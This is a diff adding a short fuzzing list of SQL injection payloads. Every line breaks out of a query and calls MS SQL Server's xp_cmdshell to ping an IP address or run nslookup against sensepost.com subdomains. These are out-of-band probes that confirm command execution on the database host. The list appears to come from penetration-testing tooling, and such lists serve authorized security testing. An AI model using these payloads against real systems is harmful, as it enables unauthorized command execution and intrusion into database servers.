@@ -1,0 +1,11 @@
+test' exec master..xp_cmdshell 'ping 168.210.134.79'--
+test' exec master..xp_cmdshell 'nslookups SQLINJECT-TESTQ.sensepost.com'--
+test' exec master..xp_cmdshell 'nslookup SQLINJET-TESTQ-DIRECT.sensepost.com 168.210.134.5'--
+10 exec master..xp_cmdshell 'ping 168.210.134.79'--
+10 exec master..xp_cmdshell 'nslookup SQLINJECT-10.sensepost.com'--
+10 exec master..xp_cmdshell 'nslookup SQLINJECT-10-DIRECT.sensepost.com 168.210.134.5'--
+10' exec master..xp_cmdshell 'nslookup SQLINJECT-10Q.sensepost.com'--
+10' exec master..xp_cmdshell 'nslookup SQLINJECT-10Q-DIRECT.sensepost.com 168.210.134.5'--
+10' exec master..xp_cmdshell 'ping 168.210.134.79'--
+
+
